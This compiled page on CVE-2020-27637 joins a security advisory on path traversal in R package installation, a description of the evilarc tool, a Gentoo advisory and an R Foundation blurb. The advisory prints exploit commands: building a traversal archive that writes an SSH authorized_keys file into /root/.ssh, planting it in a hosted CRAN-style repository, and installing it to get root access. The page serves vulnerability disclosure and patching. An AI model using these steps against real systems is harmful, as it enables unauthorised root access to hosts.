# CRAN Version 4.0.2 Advisory

By:
[Chris Davis, Senior Security Consultant](https://bishopfox.com/authors/chris-davis)
& [Joe DeMesy, Principal](https://bishopfox.com/authors/joe-demesy)

![Gauge with medium severity reading for FlowscreenComponents Basepack, Version 3.0.7 Advisory. Mautic Version <=3.2.2 Advisory. eCatcher Desktop, Version 6.6.4 Advisory.](https://assets.bishopfox.com/prod-1437/Images/channels/blog/advisories-risk-level/Medium-Risk-Advisory-Featured.jpg)

## CRAN ADVISORY SUMMARY

The R programming language’s default package manager CRAN is affected by a path traversal vulnerability that can lead to server compromise. This vulnerability affects packages installed via the `R CMD install` cli command or the `instal l.packages()` function from the interpreter.

### Impact: Medium Risk Level

The R packaging system leverages the `tar.gz` format to bundle source code. Attackers can create malicious packages that contain path traversal payloads in the archive header of `tar.gz` files, which then allow files to be written outside of the specified installation directory during unarchiving. Depending on the permissions of the user installing the malicious dependency, this issue can be leveraged to overwrite legitimate binaries on the host, create cronjobs, or write SSH keys to the affected host resulting in compromise.

### Affected Vendor

| **Product Vendor** | Product Name | Affected Version |
| --- | --- | --- |
| CRAN | CRAN package manager | 4.0.2 and prior |

### Product Description

CRAN is the default package manager for installing source code packages for the R programming language. The project’s official website is <https://cran.r-project.org/>. The latest version of the application is 4.0.3, released on October 10, 2020.

### Solution

Update to version 4.0.3

## VULNERABILITIES

### PATH TRAVERSAL

The R language package manager CRAN is vulnerable to compressed file path traversal that results in arbitrary file write and therefore code execution. To create a compressed file path traversal payload, the publicly available tool Evilarc from GitHub (<https://github.com/ptoomey3/evilarc>) was used with the following commands:

| **CVE ID** | **Security Risk** | **Impact** | **Access Vector** |
| --- | --- | --- | --- |
| [CVE-2020-27637](https://nvd.nist.gov/vuln/detail/CVE-2020-27637) | Medium | Code execution | Remote |

```
$ python evilarc.py --os unix -p root/.ssh/ -f Matrix.tar authorized_keys
Creating Matrix.tar containing ../../../../../../../../root/.ssh/authorized_keys

$ mv Matrix.tar Matrix.tar.gz
```

Figure 1 - Commands to create path traversal payload

In the figure above,`authorized_keys` contained a valid SSH public key. Once the payload was created, an R CRAN repository was built following the steps outlined in the following blog post: <https://blog.sellorm.com/2019/03/30/build-your-own-cran-like-repo/>. The path traversal payload was then moved to replace the legitimate Matrix package in the created repository with the following command:

```
$ mv Matrix.tar.gz cranroot/src/contrib/Matrix_1.2-18.tar.gz
```

Figure 2 - Command to replace valid package with path traversal package

With the payload set in a CRAN-style repository, the payload was then hosted with the following commands:

```
$ cd cranroot/
$ python -m SimpleHTTPServer 80
```

Figure 3 - Commands to host malicious repository

The package was then installed in an R repel from a second server:

```
$ R

‘/tmp/Rtmp2dXKun/downloaded_packages’
Warning message:
In install.packages("Matrix", source = TRUE, repos = "http://[REDACTED]") :

```

Figure 4 - Using R CRAN to install malicious package

R gave an error because the package contained only a file path traversal and no legitimate code. However, the file path traversal executed successfully and `authorized_keys` was written to `/root/.ssh.` The attacker thus was allowed to SSH into the server that installed the package as the root user. This resulted in full compromise of the underlying server where the package install occurred. This exploit could also be done locally using the `R CMD INSTALL` feature. For demonstration purposes, a directory was created in the temporary directory:

```
$ mkdir /tmp/DEMO
$ ls -la /tmp/DEMO
total 8
drwxr-xr-x 2 root root 4096 Sep 18 09:22 .
drwxrwxrwt 35 root root 4096 Sep 18 09:22 ..
```

Figure 5 - Creation of an empty demo directory

The same path traversal was then exploited for demonstration locally:

```
$ python evilarc.py --os unix -p tmp/DEMO/ -f demo.tar authorized_keys
$ mv demo.tar demo.tar.gz
$ R CMD INSTALL demo.tar.gz
ERROR: cannot extract package from ‘demo.tar.gz’
$ ls -la /tmp/DEMO/
total 12
drwxr-xr-x 2 root root 4096 Sep 18 09:28 .
drwxrwxrwt 35 root root 4096 Sep 18 09:28 ..
-rw-r--r-- 1 root root 399 Sep 11 07:47 <strong><mark>authorized_keys</mark></strong
```

Figure 6 - R CMD INSTALL exploitation demo

This path traversal vulnerability could be exploited by enticing R developers to install arbitrary packages hosted in arbitrary repositories, in local affected packages, or potentially in the standard CRAN repository. However, hosting path traversal payloads in the legitimate standard CRAN repository was not confirmed to be possible during testing.

# evilarc

## Purpose

evilarc lets you create a zip file that contains files with directory traversal characters in their embedded path. Most commercial zip program (winzip, etc) will prevent extraction of zip files whose embedded files contain paths with directory traversal characters. However, many software development libraries do not include these same protection mechanisms (ex. Java, PHP, etc). If a program and/or library does not prevent directory traversal characters then evilarc can be used to generate zip files that, once extracted, will place a file at an arbitrary location on the target system.

## About

Create tar/zip archives that can exploit directory traversal vulnerabilities

# R: Directory Traversal — GLSA **202401-07**

A vulnerability was found in R which could allow for remote code execution.

### Affected packages

| Package | **dev-lang/R** on all architectures |
| --- | --- |
| Affected versions | < **4.0.4** |
| Unaffected versions | >= **4.0.4** |

### Background

R is a language and environment for statistical computing and graphics.

### Description

The native R package installation mechanisms do not sufficiently validate installed source packages for path traversal.

### Impact

Installation of a malicious R package could result in an arbitrary file overwrite which could result in arbitrary code execution, as might be seen with the overwrite of an authorized\_keys file.

### Workaround

There is no known workaround at this time.

### Resolution

All R users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=dev-lang/R-4.0.4"

```
### References

* [CVE-2020-27637](https://nvd.nist.gov/vuln/detail/CVE-2020-27637)

**Release date**

January 06, 2024

**Latest revision**

January 06, 2024: 1

**Severity**

normal

**Exploitable**

remote

# The R Foundation

The R Foundation is a not for profit organization working in the public interest. It has been founded by the members of the R Development Core Team in order to

* Provide support for the R project and other innovations in statistical computing. We believe that R has become a mature and valuable tool and we would like to ensure its continued development and the development of future innovations in software for statistical and computational research.
* Provide a reference point for individuals, instititutions or commercial enterprises that want to support or interact with the R development community.
* Hold and administer the copyright of R software and documentation.

R is an official part of the [Free Software Foundation](https://www.fsf.org/)âs GNU project, and the R Foundation has similar goals to other open source software foundations like the [Apache Foundation](https://www.apache.org/foundation/) or the [GNOME Foundation](http://foundation.gnome.org).

Among the goals of the R Foundation are the support of continued development of R, the exploration of new methodology, teaching and training of statistical computing and the organization of meetings and conferences with a statistical computing orientation. We hope to attract sufficient funding to make these goals realities.

The **R Foundation Statutes** can be downloaded as PDF file in [English](Rfoundation-statutes.pdf) or [German](Rfoundation-statutes-at.pdf).
